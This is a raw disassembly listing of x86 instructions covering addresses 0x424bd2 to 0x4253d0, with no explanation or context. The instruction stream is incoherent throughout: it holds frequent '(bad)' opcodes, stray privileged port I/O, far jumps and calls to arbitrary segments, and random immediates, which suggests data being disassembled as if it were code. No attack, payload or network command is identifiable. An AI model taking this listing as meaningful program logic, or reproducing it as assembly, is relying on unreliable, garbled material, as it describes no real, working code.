  424bd2:	mov    edi,0xae1741db
  424bd7:	cmp    BYTE PTR [ebp+0x95e06d5],al
  424bdd:	jo     0x424b86
  424bdf:	(bad)  
  424be0:	int3   
  424be1:	aaa    
  424be2:	adc    dl,BYTE PTR [ebx-0x6dde0e8d]
  424be8:	rcl    edi,cl
  424bea:	add    al,0x6b
  424bec:	and    al,BYTE PTR [ebx+0x3c]
  424bef:	sub    al,0xe7
  424bf1:	lods   eax,DWORD PTR ds:[esi]
  424bf2:	add    eax,0x5754f262
  424bf7:	mov    WORD PTR [edi],ds
  424bf9:	das    
  424bfa:	jmp    0xee2538d3
  424bff:	retf   
  424c00:	ds hlt 
  424c02:	inc    esi
  424c03:	sub    ebx,esi
  424c05:	xchg   ecx,eax
  424c06:	pop    edi
  424c07:	(bad)  
  424c08:	shr    WORD PTR [eax],1
  424c0b:	fisttp WORD PTR [edx-0x52]
  424c0e:	mov    ecx,DWORD PTR [ecx-0x3a28a8a8]
  424c14:	adc    ebp,esp
  424c16:	ret    0xe9c5
  424c19:	fild   QWORD PTR [esp+edi*8]
  424c1c:	loopne 0x424c1e
  424c1e:	xchg   esi,eax
  424c1f:	fnstsw WORD PTR [edx+0x52]
  424c22:	sbb    ch,BYTE PTR [ebx+eiz*2-0x20e6d8a7]
  424c29:	repz fild WORD PTR [edi+0x26]
  424c2d:	adc    DWORD PTR [eax+0x26],ebx
  424c30:	mov    bh,0xff
  424c32:	push   ds
  424c33:	lock jp 0x424ca0
  424c36:	mov    WORD PTR [eax+0x45],ss
  424c39:	mov    ebp,0x8ca35159
  424c3e:	and    al,0xf5
  424c40:	and    eax,0x9b87473f
  424c45:	cli    
  424c46:	dec    ax
  424c48:	ds cdq 
  424c4a:	or     eax,0xc081bdf1
  424c4f:	or     ch,bl
  424c51:	jl     0x424c7d
  424c53:	add    ah,ah
  424c55:	std    
  424c56:	xor    ch,bh
  424c58:	ja     0x424cae
  424c5a:	inc    edx
  424c5b:	(bad)  
  424c5c:	in     eax,dx
  424c5d:	add    DWORD PTR [ecx],edx
  424c5f:	ins    BYTE PTR es:[edi],dx
  424c60:	ja     0x424c7f
  424c62:	or     bh,BYTE PTR ds:0x81b2ab74
  424c68:	das    
  424c69:	pop    edx
  424c6a:	repnz loop 0x424cc8
  424c6d:	imul   DWORD PTR [ebx+0x38]
  424c70:	fldenv [edx]
  424c72:	cmp    eax,0xdb3ebe34
  424c77:	cmp    eax,0x83b99873
  424c7c:	push   cs
  424c7d:	fdivrp st(3),st
  424c7f:	push   esp
  424c80:	push   esp
  424c81:	cmp    ebp,esi
  424c83:	pop    eax
  424c84:	push   0x57
  424c86:	push   eax
  424c87:	mov    edi,0x805ad34f
  424c8c:	cdq    
  424c8d:	aas    
  424c8e:	gs push 0x69a43969
  424c94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c95:	popa   
  424c96:	dec    esp
  424c97:	xchg   ebp,eax
  424c98:	scas   al,BYTE PTR es:[edi]
  424c99:	or     ah,BYTE PTR [eax-0x44f97d3b]
  424c9f:	cmp    al,0x76
  424ca1:	inc    esp
  424ca2:	adc    ebp,edx
  424ca4:	xchg   edx,eax
  424ca5:	fldenv [edi]
  424ca7:	pop    edi
  424ca8:	mov    ebp,0x2f78a65
  424cad:	in     al,dx
  424cae:	std    
  424caf:	lock or dl,BYTE PTR ds:0xb3c1f16a
  424cb6:	std    
  424cb7:	dec    ebp
  424cb8:	adc    esp,DWORD PTR [ebp-0x3c6efefd]
  424cbe:	pop    esp
  424cbf:	cmp    ch,cl
  424cc1:	mov    dl,0xc1
  424cc3:	sbb    al,0x31
  424cc5:	adc    al,0x1b
  424cc7:	fld    TBYTE PTR [eax+edx*8+0x8]
  424ccb:	cdq    
  424ccc:	test   eax,0x831ffd01
  424cd1:	pusha  
  424cd2:	ret    
  424cd3:	sti    
  424cd4:	or     al,0x94
  424cd6:	fisub  DWORD PTR [eax]
  424cd8:	lds    esi,FWORD PTR [eax]
  424cda:	addr16 mov cl,0x86
  424cdd:	lea    esp,[edi]
  424cdf:	out    dx,eax
  424ce0:	add    dh,BYTE PTR [bx+si+0x2194]
  424ce5:	daa    
  424ce6:	pop    esi
  424ce7:	dec    ebx
  424ce8:	xchg   ebx,eax
  424ce9:	pop    ecx
  424cea:	inc    ebp
  424ceb:	jecxz  0x424d05
  424ced:	mov    edx,0xa63c5a2d
  424cf2:	mov    edi,0x675987e5
  424cf7:	js     0x424c8f
  424cf9:	dec    edi
  424cfa:	stos   DWORD PTR es:[edi],eax
  424cfb:	cdq    
  424cfc:	mov    cl,0x6e
  424cfe:	mov    cs,WORD PTR [esi+eiz*8]
  424d01:	shl    BYTE PTR [eax-0x611a9598],1
  424d07:	adc    eax,0x79d584aa
  424d0c:	enter  0x14c7,0x32
  424d10:	dec    esi
  424d11:	sub    esi,DWORD PTR [edi+0x7df7eadd]
  424d17:	pop    edx
  424d18:	lds    ebp,FWORD PTR [edx]
  424d1a:	test   esp,edx
  424d1c:	xor    ecx,DWORD PTR [ebx+edi*2+0x75eb5322]
  424d23:	sub    edx,ebp
  424d25:	fld    QWORD PTR [edi+eiz*1-0x139abc3e]
  424d2c:	lods   al,BYTE PTR ds:[esi]
  424d2d:	fisub  WORD PTR [ebx-0x6]
  424d30:	add    eax,0xdf725205
  424d35:	sub    al,0x3f
  424d37:	cmp    esi,DWORD PTR [esi-0x64]
  424d3a:	cmp    BYTE PTR [edi+ebx*1-0x3850425a],ah
  424d41:	pushf  
  424d42:	sbb    edx,DWORD PTR [edx]
  424d44:	push   ss
  424d45:	into   
  424d46:	pop    esi
  424d47:	mov    ebx,0x3df36a4d
  424d4c:	push   ds
  424d4d:	push   ss
  424d4e:	(bad)  
  424d4f:	fnstsw WORD PTR [esi+0x5c]
  424d52:	(bad)  
  424d53:	push   ds
  424d54:	sahf   
  424d55:	mov    ebp,edi
  424d57:	test   DWORD PTR [ebp+0x529465a],ebp
  424d5d:	retf   0x3125
  424d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d61:	or     eax,0xbb0b81cf
  424d66:	jecxz  0x424d26
  424d68:	inc    eax
  424d69:	jnp    0x424d84
  424d6b:	out    dx,eax
  424d6c:	jns    0x424d59
  424d6e:	call   0xce41:0xfe1feffb
  424d75:	mov    ecx,0x8f864cbd
  424d7a:	inc    edx
  424d7b:	mov    esp,0x581650e3
  424d80:	das    
  424d81:	jno    0x424d3b
  424d83:	mov    edx,0x8bc11c54
  424d88:	test   al,0x37
  424d8a:	mov    dl,0x79
  424d8c:	inc    ebp
  424d8d:	jl     0x424d67
  424d8f:	out    dx,eax
  424d90:	pop    ss
  424d91:	pushf  
  424d92:	fs repnz inc ebp
  424d95:	push   ecx
  424d96:	mov    DWORD PTR [esi-0x665e1634],edx
  424d9c:	sub    esp,DWORD PTR [ebx-0x7d]
  424d9f:	ins    DWORD PTR es:[edi],dx
  424da0:	out    0xb1,al
  424da2:	jo     0x424e20
  424da4:	outs   dx,BYTE PTR ds:[esi]
  424da5:	pop    eax
  424da6:	mov    edx,0x29eefab0
  424dab:	lahf   
  424dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424dad:	lea    eax,ss:[eax+0x40e747ee]
  424db4:	enter  0x883d,0x61
  424db8:	ror    BYTE PTR [esi*1-0x1adb0871],cl
  424dbf:	xchg   esi,eax
  424dc0:	loopne 0x424d73
  424dc2:	jl     0x424de8
  424dc4:	xor    eax,0xa7e76082
  424dc9:	mov    ch,0xb5
  424dcb:	xor    bh,BYTE PTR [ebx+ecx*4-0x1288269e]
  424dd2:	xchg   ebx,eax
  424dd4:	jge    0x424e48
  424dd6:	sub    al,0x84
  424dd8:	jg     0x424dbc
  424dda:	cwde   
  424ddb:	test   DWORD PTR [ebx],0x42e352c7
  424de1:	fcmovnbe st,st(6)
  424de3:	push   edi
  424de4:	(bad)
  424de8:	fnstenv [esi+0x7d]
  424deb:	push   ecx
  424dec:	lods   eax,DWORD PTR ds:[esi]
  424ded:	arpl   dx,bp
  424def:	fild   WORD PTR [edi]
  424df1:	addr16 stc 
  424df3:	cmp    al,0xc1
  424df5:	add    ecx,DWORD PTR [ebp+0x69900408]
  424dfb:	call   0xd135:0xe969b403
  424e02:	rcl    BYTE PTR [ebx+esi*2+0x1b],0xab
  424e07:	sbb    ebp,DWORD PTR [ebp-0x40]
  424e0a:	jg     0x424e1d
  424e0c:	mov    dl,0x11
  424e0e:	sbb    al,0x52
  424e10:	cmp    BYTE PTR [ebp-0x68],al
  424e13:	inc    ebx
  424e14:	cs jns 0x424e46
  424e17:	nop
  424e18:	int3   
  424e19:	fsubr  DWORD PTR [esi-0x75e730b4]
  424e1f:	push   esp
  424e20:	sub    esp,DWORD PTR [esi+0x15]
  424e23:	xchg   esp,eax
  424e24:	gs retf 0x47ad
  424e28:	call   DWORD PTR [ebx]
  424e2a:	pusha  
  424e2b:	push   0x1f84d425
  424e30:	mov    eax,ds:0xd3a511d2
  424e35:	jmp    0x424e74
  424e37:	retf   0xbd84
  424e3a:	out    dx,eax
  424e3b:	int3   
  424e3c:	add    eax,0xf747980c
  424e41:	ins    DWORD PTR es:[edi],dx
  424e42:	cs pop ss
  424e44:	inc    ebp
  424e45:	mov    ah,0x28
  424e47:	and    BYTE PTR [eax+ebp*2],al
  424e4a:	daa    
  424e4b:	int3   
  424e4c:	js     0x424e6b
  424e4e:	sub    BYTE PTR [esi+0x3b],bh
  424e51:	(bad)  
  424e52:	xor    DWORD PTR [esi-0x67],ebx
  424e55:	test   BYTE PTR [esi+esi*8],0x6d
  424e59:	mov    esp,0xfd7b8153
  424e5e:	mov    edx,0x74e7fae6
  424e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e64:	sub    ebx,esp
  424e66:	shl    edi,0x63
  424e69:	loope  0x424ee8
  424e6b:	jne    0x424e78
  424e6d:	xchg   ebp,eax
  424e6e:	mov    gs,WORD PTR es:[edx]
  424e71:	and    bl,BYTE PTR [edi-0x47]
  424e74:	cld    
  424e75:	mov    ebx,0xf552238b
  424e7a:	mov    ch,0x27
  424e7c:	aam    0x40
  424e7e:	(bad)  
  424e7f:	(bad)  
  424e80:	fadd   DWORD PTR [ecx]
  424e82:	in     al,dx
  424e83:	data16 (bad) 
  424e86:	add    eax,DWORD PTR [esi-0x2f]
  424e89:	xor    BYTE PTR [edi-0x6f],0x51
  424e8d:	sbb    DWORD PTR [eax+0xde1b5b8],ecx
  424e93:	or     ch,0x93
  424e96:	mov    edi,DWORD PTR [edi]
  424e98:	fdiv   DWORD PTR [esp+ecx*2+0xdee0545]
  424e9f:	in     al,dx
  424ea0:	and    al,0xc3
  424ea2:	add    eax,0xd8caf4ef
  424ea7:	in     eax,dx
  424ea8:	pop    eax
  424ea9:	mov    WORD PTR [eax+0x7bcf095d],gs
  424eaf:	jno    0x424e3f
  424eb1:	iret   
  424eb2:	call   0x8da4:0xfdbe7c8
  424eb9:	stos   DWORD PTR es:[edi],eax
  424eba:	(bad)  
  424ebb:	fisttp DWORD PTR [eax]
  424ebd:	pause  
  424ebf:	dec    ebx
  424ec0:	mov    ebx,0xa1b4e2ee
  424ec5:	dec    esi
  424ec6:	(bad)  
  424ec7:	mov    bh,0x6
  424ec9:	int    0xdc
  424ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ecc:	data16 adc ch,BYTE PTR [ebp+0xd]
  424ed0:	jae    0x424ed7
  424ed2:	sub    esi,0x1771b398
  424ed8:	or     al,0x32
  424eda:	xchg   esi,eax
  424edb:	push   esi
  424edc:	fstp   QWORD PTR [edi]
  424ede:	das    
  424edf:	int    0xd2
  424ee1:	sub    BYTE PTR [esp+edi*1-0x3d],bl
  424ee5:	sub    al,0xff
  424ee7:	xor    bl,BYTE PTR [ebp-0x6eb46142]
  424eed:	push   esp
  424eee:	mov    al,0xf4
  424ef0:	pop    eax
  424ef1:	pop    edx
  424ef2:	enter  0x84f4,0x14
  424ef6:	mov    al,ds:0xe4f23eac
  424efb:	loop   0x424f26
  424efd:	aam    0xc7
  424eff:	in     al,dx
  424f00:	pop    ebp
  424f01:	dec    bl
  424f03:	jp     0x424f51
  424f05:	jb     0x424e8a
  424f07:	out    0x57,eax
  424f09:	mov    esp,0x2a96d92c
  424f0e:	fnstsw WORD PTR [edx-0x3c]
  424f11:	sbb    ecx,ecx
  424f13:	jecxz  0x424f71
  424f15:	je     0x424ee3
  424f17:	or     BYTE PTR [esi+0x7c],cl
  424f1a:	xor    esi,DWORD PTR [esi+0x7578219d]
  424f20:	and    BYTE PTR [ebx+0x7a],al
  424f23:	add    DWORD PTR [edx],0xfffffff6
  424f26:	jno    0x424f00
  424f28:	xor    esp,esp
  424f2a:	data16 (bad) 
  424f2c:	shr    edi,cl
  424f2e:	test   BYTE PTR [eax+ecx*8],bl
  424f31:	adc    DWORD PTR [ecx+0x50],edi
  424f34:	cmp    eax,DWORD PTR ds:0x848fa6b6
  424f3a:	jmp    0xcfad:0xe7b69b6e
  424f41:	jo     0x424f32
  424f43:	xchg   edx,eax
  424f44:	sbb    BYTE PTR [ecx-0x3ac9dae8],ah
  424f4a:	dec    esi
  424f4b:	xor    eax,0x201fd666
  424f50:	mov    eax,0xfedf5b38
  424f55:	or     al,BYTE PTR [esi-0x29736000]
  424f5b:	fwait
  424f5c:	mov    ch,0x2d
  424f5e:	adc    BYTE PTR [ecx],0x27
  424f61:	stc    
  424f62:	jg     0x424f8f
  424f64:	mov    ebx,0xaaa32e96
  424f69:	in     eax,dx
  424f6a:	clc    
  424f6b:	ret    
  424f6c:	add    BYTE PTR [ecx-0x5148b3a3],al
  424f72:	inc    ebx
  424f73:	fld    TBYTE PTR [eax+0x14362b61]
  424f79:	pusha  
  424f7a:	repnz and al,0xcd
  424f7d:	into   
  424f7e:	push   ecx
  424f7f:	lea    edi,[ebp-0x2ab423de]
  424f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f86:	imul   edi,ecx,0x1
  424f89:	push   esi
  424f8a:	inc    ecx
  424f8b:	pop    esp
  424f8c:	add    esi,DWORD PTR [edx]
  424f8e:	test   DWORD PTR [ebp+ebp*8-0x42],edx
  424f92:	aaa    
  424f93:	dec    ebp
  424f94:	test   al,0x5d
  424f96:	mov    eax,ds:0xb0cee6f5
  424f9b:	jmp    0x7686:0x613320e3
  424fa2:	outs   dx,BYTE PTR ds:[esi]
  424fa3:	ds pop ebp
  424fa5:	sub    al,0xd1
  424fa7:	test   eax,0x897475d5
  424fac:	mov    al,ds:0x6276d386
  424fb1:	mov    ebx,0xf9dc8d1f
  424fb6:	pop    esp
  424fb7:	pop    edi
  424fb8:	call   0x534c:0xc1811ba6
  424fbf:	jb     0x425030
  424fc1:	dec    edi
  424fc2:	pop    esp
  424fc3:	sar    ah,0x23
  424fc6:	xlat   BYTE PTR ds:[ebx]
  424fc7:	mov    ecx,0x781491c5
  424fcc:	jmp    0x634f847
  424fd1:	in     al,dx
  424fd2:	mul    DWORD PTR [edx+0x48]
  424fd5:	cmp    cl,BYTE PTR [ebp+esi*2-0x23]
  424fd9:	xor    al,0xdd
  424fdb:	cld    
  424fdc:	out    dx,al
  424fdd:	popa   
  424fde:	dec    ebp
  424fdf:	stc    
  424fe0:	jae    0x424f73
  424fe2:	sbb    eax,0x7808ca70
  424fe8:	cmp    BYTE PTR [ebx],cl
  424fea:	dec    eax
  424feb:	hlt    
  424fec:	and    ah,0xec
  424fef:	ret    
  424ff0:	mov    dh,0xd8
  424ff2:	gs retf 
  424ff4:	mov    esi,0xb4f9aa45
  424ff9:	(bad)  
  424ffa:	or     esi,edi
  424ffc:	or     ah,BYTE PTR [esi+0x24]
  424fff:	ds out 0x6b,eax
  425002:	stos   BYTE PTR es:[edi],al
  425003:	fcmovbe st,st(6)
  425005:	in     al,dx
  425006:	cmp    eax,0xc85c9c58
  42500b:	retf   
  42500c:	stc    
  42500d:	push   ss
  42500e:	mov    ds:0x59c8730f,al
  425013:	and    DWORD PTR [ebp+0xf],eax
  425016:	out    0x7b,al
  425018:	fisttp QWORD PTR [eax+eax*2]
  42501b:	imul   ecx
  42501d:	xlat   BYTE PTR ds:[ebx]
  42501e:	hlt    
  42501f:	mov    esp,0x7961e1fe
  425024:	xor    ebp,DWORD PTR [eax+edx*1-0x41]
  425028:	into   
  425029:	pop    edi
  42502a:	sub    dl,BYTE PTR [ebp-0x75974461]
  425030:	xchg   edi,eax
  425031:	sub    eax,0x7f0d7579
  425036:	gs xor al,0x4a
  425039:	jmp    0x8fd3da54
  42503e:	xchg   edi,eax
  42503f:	inc    esi
  425040:	repnz aam 0x7e
  425043:	jmp    0xd9e06699
  425048:	and    eax,0x558b77c3
  42504d:	es jne 0x425052
  425050:	xchg   ebp,eax
  425051:	add    eax,0xcf0699c0
  425056:	lds    esi,FWORD PTR [ecx*2+0x47843d89]
  42505d:	bound  ebp,QWORD PTR [edx]
  42505f:	or     eax,0x4fc9d690
  425064:	jo     0x425004
  425066:	sub    BYTE PTR [ebp-0x610d8015],cl
  42506c:	xchg   ebp,eax
  42506d:	and    al,0x8a
  42506f:	call   0x936ac3a
  425074:	lds    ebx,FWORD PTR [esp+eax*8-0x53b623df]
  42507b:	cmp    DWORD PTR [edx-0x35],eax
  42507e:	(bad)  
  42507f:	mov    dl,0x22
  425081:	and    al,0x5a
  425083:	sub    eax,0x6f379c6a
  425088:	fchs   
  42508a:	clc    
  42508b:	push   eax
  42508c:	out    dx,eax
  42508d:	fisub  WORD PTR [esi+0x17119ff]
  425093:	adc    esp,ecx
  425095:	push   0xffffffde
  425097:	aad    0x1d
  425099:	mov    ebx,0x40568839
  42509e:	out    0xee,al
  4250a0:	mov    dh,0xe2
  4250a2:	pop    ecx
  4250a3:	or     edx,DWORD PTR [ebp+0x77d6a540]
  4250a9:	imul   ebx,esi,0x182a7f12
  4250af:	cmp    esp,DWORD PTR [eax]
  4250b1:	mov    ebp,cs
  4250b3:	xchg   DWORD PTR ds:0x9f101cde,ecx
  4250b9:	and    eax,0x2d862f81
  4250be:	jmp    0x1737:0x48fe4ffd
  4250c5:	cli    
  4250c6:	scas   eax,DWORD PTR es:[edi]
  4250c7:	out    0x6f,al
  4250c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250ca:	jne    0x425107
  4250cc:	scas   al,BYTE PTR es:[edi]
  4250cd:	mov    edi,0x7c12fe7f
  4250d2:	mov    eax,0xa58ce760
  4250d7:	add    dh,BYTE PTR [esi-0x6b]
  4250da:	(bad)  
  4250dc:	fsubr  st,st(5)
  4250de:	scas   eax,DWORD PTR es:[edi]
  4250df:	mov    dl,0x4f
  4250e1:	aad    0x1d
  4250e3:	test   DWORD PTR [ebx+0x78e22abc],edx
  4250e9:	out    dx,eax
  4250ea:	and    al,0xaa
  4250ec:	push   0x33
  4250ee:	jne    0x425091
  4250f0:	mov    edx,0xfdab0f9c
  4250f5:	sbb    bl,BYTE PTR [eax+0x5523a95b]
  4250fb:	push   esi
  4250fc:	lods   al,BYTE PTR ds:[esi]
  4250fd:	outs   dx,DWORD PTR ds:[esi]
  4250fe:	and    BYTE PTR [ebx-0x75],0xf7
  425102:	(bad)  
  425103:	sbb    ecx,eax
  425105:	add    BYTE PTR [eax],al
  425107:	add    BYTE PTR [eax],al
  425109:	add    BYTE PTR [ecx+0x55],bl
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x10e03096
  425119:	jg     0x425118
  42511b:	fiadd  WORD PTR [ecx]
  42511d:	add    BYTE PTR [ebx+0x5e000006],al
  425123:	mov    bh,0xed
  425125:	(bad)  
  425126:	mov    ah,0xce
  425128:	scas   eax,DWORD PTR es:[edi]
  425129:	jbe    0x4250b1
  42512b:	call   0xde6ac2c3
  425130:	pop    esp
  425131:	int3   
  425132:	and    ecx,edx
  425134:	popf   
  425135:	ja     0x42517f
  425137:	repz jmp 0xa5c6:0xf73da25a
  42513f:	mov    WORD PTR [esi],es
  425141:	outs   dx,BYTE PTR ds:[esi]
  425142:	mov    cl,0x6c
  425144:	xchg   edi,ebx
  425146:	inc    edx
  425147:	jg     0x4250f4
  425149:	daa    
  42514a:	(bad)  
  42514b:	ds mov al,cl
  42514e:	stc    
  42514f:	push   ds
  425150:	test   eax,0xf11e1117
  425155:	push   es
  425156:	int    0xf1
  425158:	or     BYTE PTR [edi],al
  42515a:	clc    
  42515b:	sbb    dl,BYTE PTR [eax+0x7b]
  42515e:	dec    ecx
  42515f:	dec    DWORD PTR [ebx+0x3b]
  425162:	mov    al,ds:0xeb962540
  425167:	cdq    
  425168:	dec    edi
  425169:	push   0x751d49c4
  42516e:	rcl    BYTE PTR [ebx+0x5e5e072c],cl
  425174:	inc    ebx
  425175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425176:	push   ss
  425177:	iret   
  425178:	leave  
  425179:	imul   eax,esp,0x4a3a98a7
  42517f:	or     al,0xb5
  425181:	in     al,0x45
  425183:	inc    esi
  425184:	jnp    0x425168
  425186:	retf   
  425187:	mov    edx,0x9c307783
  42518c:	mov    dl,0x39
  42518e:	mov    bh,0xb1
  425190:	das    
  425191:	mov    dl,0xd2
  425193:	aad    0x58
  425195:	push   eax
  425196:	test   BYTE PTR [edi+0x68],ch
  425199:	xchg   DWORD PTR [esi-0x58d379ac],ebx
  42519f:	pop    ecx
  4251a0:	lahf   
  4251a1:	push   0x5f89e8f8
  4251a6:	dec    BYTE PTR [ecx-0xf]
  4251a9:	fst    QWORD PTR [esi+eax*8]
  4251ac:	(bad)  
  4251ad:	cld    
  4251ae:	(bad)  
  4251b0:	scas   eax,DWORD PTR es:[edi]
  4251b1:	cli    
  4251b2:	mov    eax,0xb229e3ea
  4251b7:	outs   dx,BYTE PTR ds:[esi]
  4251b8:	sub    BYTE PTR [esi-0x51],0xc0
  4251bc:	ss sbb ebp,ebx
  4251bf:	xor    eax,0xe1772a92
  4251c4:	jmp    0x425197
  4251c6:	push   ss
  4251c7:	enter  0xb7c7,0xf0
  4251cb:	jp     0x4251a2
  4251cd:	inc    DWORD PTR [edx-0x470406b0]
  4251d3:	adc    DWORD PTR [edx-0x396f467e],ebx
  4251d9:	jne    0x425224
  4251db:	add    al,0x9b
  4251dd:	iret   
  4251de:	and    al,0xed
  4251e0:	or     DWORD PTR [edx],ebx
  4251e2:	pop    edi
  4251e3:	bound  edi,QWORD PTR [eax+0x2232d308]
  4251e9:	xchg   dh,al
  4251eb:	in     al,dx
  4251ec:	fistp  DWORD PTR [ecx+ebp*8-0xe]
  4251f0:	mov    al,ds:0x6a7b4ec1
  4251f5:	fs out dx,eax
  4251f7:	cmp    dh,BYTE PTR [ebp+0x58dd422]
  4251fd:	mov    edx,0x1b0ef317
  425202:	dec    ebx
  425203:	out    dx,al
  425204:	xchg   ebp,eax
  425205:	jnp    0x4251f6
  425207:	adc    dl,dl
  425209:	test   al,0x4a
  42520b:	pop    edx
  42520c:	rcl    BYTE PTR [edi],1
  42520e:	iret   
  42520f:	sahf   
  425210:	sub    eax,0x5304320f
  425215:	pop    ecx
  425216:	les    eax,FWORD PTR [eax]
  425218:	xchg   esp,eax
  425219:	push   ds
  42521a:	inc    ecx
  42521b:	jne    0x425230
  42521d:	cmp    cl,BYTE PTR [esi-0x2b36f980]
  425223:	sub    esi,DWORD PTR [edi]
  425225:	and    bh,BYTE PTR [edx+0x4c]
  425228:	(bad)  
  425229:	cmp    bh,BYTE PTR [ebp+ebp*8-0x16]
  42522d:	dec    esi
  42522e:	add    ch,BYTE PTR [eax+0x78]
  425231:	pop    ebx
  425232:	addr16 mov ds:0xde55,al
  425236:	sbb    esp,DWORD PTR [edx+0x52]
  425239:	mov    esp,0x1a801e20
  42523e:	push   ebp
  42523f:	xor    al,0x68
  425241:	data16 mov dl,0xa1
  425244:	es je  0x425202
  425247:	mov    al,ds:0xd4a6d57
  42524c:	or     eax,DWORD PTR [eax+edi*4+0x1d2893e0]
  425253:	ins    DWORD PTR es:[edi],dx
  425254:	aaa    
  425255:	(bad)  
  425256:	js     0x425206
  425258:	in     al,0xfc
  42525a:	cs push esi
  42525c:	out    0x23,al
  42525e:	mov    eax,ds:0xb8eb0d85
  425263:	jae    0x42527c
  425265:	sar    DWORD PTR [esi+0x78],cl
  425268:	mov    ds:0x708ff5cc,eax
  42526d:	or     eax,0x5a33a066
  425272:	std    
  425273:	jno    0x425232
  425275:	cmp    ecx,DWORD PTR [ebp-0x69]
  425278:	imul   ebp,DWORD PTR ds:0x32b8c455,0xffffff83
  42527f:	jne    0x425230
  425281:	inc    esp
  425282:	stos   BYTE PTR es:[edi],al
  425283:	(bad)  
  425285:	rol    DWORD PTR [eax-0x63169f02],1
  42528b:	iret   
  42528c:	jno    0x425231
  42528e:	aaa    
  42528f:	leave  
  425290:	arpl   WORD PTR [ebx-0x3a],si
  425293:	inc    edi
  425294:	icebp  
  425295:	cli    
  425296:	push   ecx
  425297:	adc    dh,BYTE PTR [edi]
  425299:	jg     0x42523a
  42529b:	add    dl,BYTE PTR [eax]
  42529d:	std    
  42529e:	adc    ebp,esp
  4252a0:	(bad)  [ebp+0x49]
  4252a3:	ins    BYTE PTR es:[edi],dx
  4252a4:	pop    ebx
  4252a5:	imul   edx,eax,0x4979a197
  4252ab:	sbb    al,0x68
  4252ad:	jmp    0xc482559f
  4252b2:	push   edi
  4252b3:	xor    bl,BYTE PTR [ebp+0x14]
  4252b6:	jmp    0x42529b
  4252b8:	dec    ebp
  4252b9:	lods   eax,DWORD PTR ds:[esi]
  4252ba:	mov    ebx,0x77205e38
  4252bf:	adc    BYTE PTR [esp+edx*8+0x29],bh
  4252c3:	dec    edx
  4252c4:	pop    esi
  4252c5:	adc    eax,0x4d653e27
  4252ca:	add    DWORD PTR [ebx-0x7bd32599],edi
  4252d0:	test   al,0x1a
  4252d2:	rol    BYTE PTR [esi+eax*2-0x216162ee],0x58
  4252da:	xlat   BYTE PTR ds:[ebx]
  4252db:	(bad)  
  4252dc:	sti    
  4252dd:	(bad)  
  4252de:	pop    ebp
  4252df:	repz sbb eax,0xc76c7b72
  4252e5:	push   0xe
  4252e7:	mov    edi,0xeae9a41
  4252ec:	gs aaa 
  4252ee:	jae    0x425293
  4252f0:	jecxz  0x425304
  4252f2:	fisttp WORD PTR [edx-0x1c]
  4252f5:	pop    ecx
  4252f6:	mov    dl,0xe7
  4252f8:	mov    bh,0x31
  4252fa:	test   al,0x94
  4252fc:	xchg   BYTE PTR [ebx-0x28],dh
  4252ff:	ret    0xe7bc
  425302:	rcl    DWORD PTR [esi-0x605c4852],cl
  425308:	jge    0x4252f7
  42530a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42530b:	retf   
  42530c:	pop    ss
  42530d:	mov    eax,ds:0xc75b9363
  425312:	in     eax,0x3d
  425314:	ins    BYTE PTR es:[edi],dx
  425315:	hlt    
  425316:	imul   ebp,DWORD PTR [edx+edi*1+0x45],0x55
  42531b:	outs   dx,BYTE PTR ds:[esi]
  42531c:	or     ebx,DWORD PTR [esi]
  42531e:	popf   
  42531f:	call   0xbc29f020
  425324:	or     eax,DWORD PTR [edx-0x18]
  425327:	jmp    0x9dd0:0xe0a366c8
  42532e:	pop    ecx
  42532f:	int    0xd4
  425331:	jl     0x4252b6
  425333:	pop    ss
  425334:	dec    ecx
  425335:	or     DWORD PTR [eax],esi
  425337:	stos   DWORD PTR es:[edi],eax
  425338:	and    BYTE PTR [ebp+esi*2-0x24f88b5f],cl
  42533f:	fwait
  425340:	inc    ebp
  425341:	popf   
  425342:	rcl    BYTE PTR [edi-0xc7e4e7b],cl
  425348:	call   0x73a1dc97
  42534d:	scas   eax,DWORD PTR es:[edi]
  42534e:	mov    esi,0x6076bc44
  425353:	call   0x1a61583d
  425358:	add    al,0x38
  42535a:	mov    ecx,0xedb931d2
  42535f:	js     0x4252ed
  425361:	les    edx,FWORD PTR [esi-0xb]
  425364:	mov    esp,0x3f402b78
  425369:	pop    eax
  42536a:	test   al,0x73
  42536c:	adc    ebx,0x42
  42536f:	dec    ebx
  425370:	cmc    
  425371:	jmp    0x425386
  425373:	xor    BYTE PTR [ecx+0xc592201],cl
  425379:	dec    edx
  42537a:	shl    BYTE PTR [edx-0x41bea830],cl
  425380:	add    esp,DWORD PTR [edi-0xb8212be]
  425386:	dec    ecx
  425387:	imul   edi,edx,0xffffff9a
  42538a:	mov    bh,0xaf
  42538c:	or     ah,cl
  42538e:	jb     0x4253f3
  425390:	jecxz  0x425354
  425392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425393:	das    
  425394:	jmp    0x425395
  425396:	push   es
  425397:	js     0x42534d
  425399:	imul   esp,ecx,0x12
  42539c:	push   esi
  42539d:	sbb    BYTE PTR [ebx-0x41],dl
  4253a0:	arpl   WORD PTR [esi+0x21],bx
  4253a3:	iret   
  4253a4:	mov    ch,0xdf
  4253a6:	adc    eax,0x7208e456
  4253ab:	xchg   ebp,eax
  4253ac:	mov    eax,DWORD PTR [ecx+0x68f801d3]
  4253b2:	test   eax,0x50b5ce60
  4253b7:	outs   dx,DWORD PTR ds:[esi]
  4253b8:	je     0x4253c7
  4253ba:	fisttp WORD PTR [edi]
  4253bc:	jle    0x4253f5
  4253be:	xchg   edi,eax
  4253bf:	jmp    0x27ad:0x4d580b8b
  4253c6:	adc    BYTE PTR [edi+0x68],bl
  4253c9:	stos   DWORD PTR es:[edi],eax
  4253ca:	icebp  
  4253cb:	and    DWORD PTR [edx-0x3],edi
  4253ce:	and    cl,dh
  4253d0:	(bad)  
